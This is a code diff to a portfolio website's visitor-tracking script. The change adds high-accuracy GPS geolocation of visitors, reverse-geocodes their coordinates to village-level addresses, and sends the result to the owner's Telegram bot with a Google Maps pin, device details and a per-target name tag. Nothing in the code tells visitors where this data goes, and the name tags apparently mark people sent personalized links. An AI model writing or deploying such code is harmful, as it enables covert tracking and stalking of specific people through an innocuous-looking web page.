@@ -240,9 +240,9 @@ const VisitorTracker = (() => {
       location: 'Mencari...'
     };
 
-    // Fetch accurate IP Location first before sending Telegram notification
+    // Fetch accurate Location (GPS High Accuracy first, IP fallback second)
     try {
-      visitData.location = await fetchVisitorLocation();
+      visitData.location = await fetchVisitorLocation(visitData);
     } catch (e) {
       visitData.location = 'Lokasi Terproteksi / Network Privacy';
     }
@@ -254,8 +254,19 @@ const VisitorTracker = (() => {
     sendTelegramNotification(visitData);
   }
 
-  async function fetchVisitorLocation() {
-    // Provider 1: ipwho.is (HTTPS, fast, highly accurate for Indonesia & global IPs)
+  async function fetchVisitorLocation(visitDataRef) {
+    // Attempt 1: Browser GPS High-Accuracy Geolocation (Like WA Live Location)
+    try {
+      const gpsResult = await getGpsLocation(4000);
+      if (gpsResult && gpsResult.locationStr) {
+        if (visitDataRef && gpsResult.mapsUrl) {
+          visitDataRef.mapsUrl = gpsResult.mapsUrl;
+        }
+        return gpsResult.locationStr;
+      }
+    } catch (e) {}
+
+    // Provider 1: ipwho.is (HTTPS, fast, highly accurate for IP ISPs)
     try {
       const res = await fetch('https://ipwho.is/', { signal: AbortSignal.timeout(3500) });
       if (res.ok) {
@@ -267,7 +278,7 @@ const VisitorTracker = (() => {
           const isp = data.connection?.isp || data.isp || '';
           const locParts = [city, region, country].filter(Boolean).join(', ');
           if (locParts) {
-            return `${locParts}${isp ? ` (${isp})` : ''}`;
+            return `🌐 IP Net: ${locParts}${isp ? ` (${isp})` : ''}`;
           }
         }
       }
@@ -282,7 +293,7 @@ const VisitorTracker = (() => {
         const region = data.regionName || '';
         const country = data.countryName || '';
         const locParts = [city, region, country].filter(Boolean).join(', ');
-        if (locParts) return locParts;
+        if (locParts) return `🌐 IP Net: ${locParts}`;
       }
     } catch (e) {}
 
@@ -298,7 +309,7 @@ const VisitorTracker = (() => {
           const org = data.org || '';
           const locParts = [city, region, country].filter(Boolean).join(', ');
           if (locParts) {
-            return `${locParts}${org ? ` (${org})` : ''}`;
+            return `🌐 IP Net: ${locParts}${org ? ` (${org})` : ''}`;
           }
         }
       }
@@ -307,17 +318,81 @@ const VisitorTracker = (() => {
     return 'Lokasi Tidak Terdeteksi / Network Privacy';
   }
 
+  function getGpsLocation(timeoutMs = 4000) {
+    return new Promise((resolve) => {
+      if (!navigator.geolocation) {
+        resolve(null);
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          try {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const accuracy = Math.round(position.coords.accuracy || 0);
+            const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+
+            // Reverse Geocode using OpenStreetMap Nominatim API
+            let placeName = '';
+            try {
+              const geoRes = await fetch(
+                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`,
+                {
+                  headers: { 'Accept-Language': 'id' },
+                  signal: AbortSignal.timeout(2500)
+                }
+              );
+              if (geoRes.ok) {
+                const geoData = await geoRes.json();
+                const addr = geoData.address || {};
+                const village = addr.village || addr.suburb || addr.neighbourhood || addr.hamlet || addr.quarter || '';
+                const district = addr.district || addr.subdistrict || addr.county || addr.town || '';
+                const city = addr.city || addr.regency || addr.city_district || '';
+                const state = addr.state || '';
+
+                const parts = [village, district, city, state].filter(Boolean).join(', ');
+                placeName = parts || geoData.display_name || '';
+              }
+            } catch (e) {}
+
+            const locationStr = placeName 
+              ? `🎯 GPS Presisi (~${accuracy}m): ${placeName}`
+              : `🎯 GPS Lat/Lon: ${lat.toFixed(5)}, ${lon.toFixed(5)} (~${accuracy}m)`;
+
+            resolve({
+              locationStr,
+              mapsUrl
+            });
+          } catch (err) {
+            resolve(null);
+          }
+        },
+        () => {
+          resolve(null);
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: timeoutMs,
+          maximumAge: 30000
+        }
+      );
+    });
+  }
+
   async function sendTelegramNotification(data) {
     if (typeof PORTFOLIO_CONFIG === 'undefined') return;
     const token = PORTFOLIO_CONFIG.telegramToken;
     const chatId = PORTFOLIO_CONFIG.telegramChatId;
     if (!token || !chatId) return;
 
+    const mapsLine = data.mapsUrl ? `\n🗺️ *Google Maps:* [Klik Lihat Titik Lokasi](${data.mapsUrl})` : '';
+
     const message = 
 `🚀 *PENGUNJUNG PORTOFOLIO BARU!*
 ━━━━━━━━━━━━━━━━━━
 👤 *Nama/Tag:* \`${data.targetName}\`
-📍 *Lokasi:* ${data.location}
+📍 *Lokasi:* ${data.location}${mapsLine}
 📱 *Perangkat:* ${data.device}
 📐 *Layar:* ${data.screen}
 🌐 *Sumber:* ${data.referrer}
@@ -400,6 +475,32 @@ const VisitorTracker = (() => {
     downloadAnchor.remove();
   }
 
+  async function sendTestLocation() {
+    const deviceInfo = detectDevice();
+    const referrerSource = detectReferrer(navigator.userAgent || '');
+    const dateObj = new Date();
+    const formattedDate = dateObj.toLocaleDateString('id-ID', {
+      day: '2-digit', month: 'short', year: 'numeric',
+      hour: '2-digit', minute: '2-digit'
+    });
+
+    const visitData = {
+      id: 'test_' + Math.random().toString(36).substr(2, 9),
+      timestamp: formattedDate,
+      rawTime: Date.now(),
+      targetName: 'TES LOKASI PRESISI (PEMILIK)',
+      isPersonalLink: true,
+      device: `${deviceInfo.deviceType} (${deviceInfo.os} - ${deviceInfo.browser})`,
+      screen: deviceInfo.screenResolution,
+      referrer: referrerSource,
+      location: 'Mencari GPS...'
+    };
+
+    visitData.location = await fetchVisitorLocation(visitData);
+    await sendTelegramNotification(visitData);
+    return visitData;
+  }
+
   function escapeHtml(str) {
     return String(str).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
   }
@@ -411,7 +512,8 @@ const VisitorTracker = (() => {
     isAuth: () => isAuthenticated,
     getLogs,
     clearLogs,
-    exportLogsJSON
+    exportLogsJSON,
+    sendTestLocation
   };
 })();
 
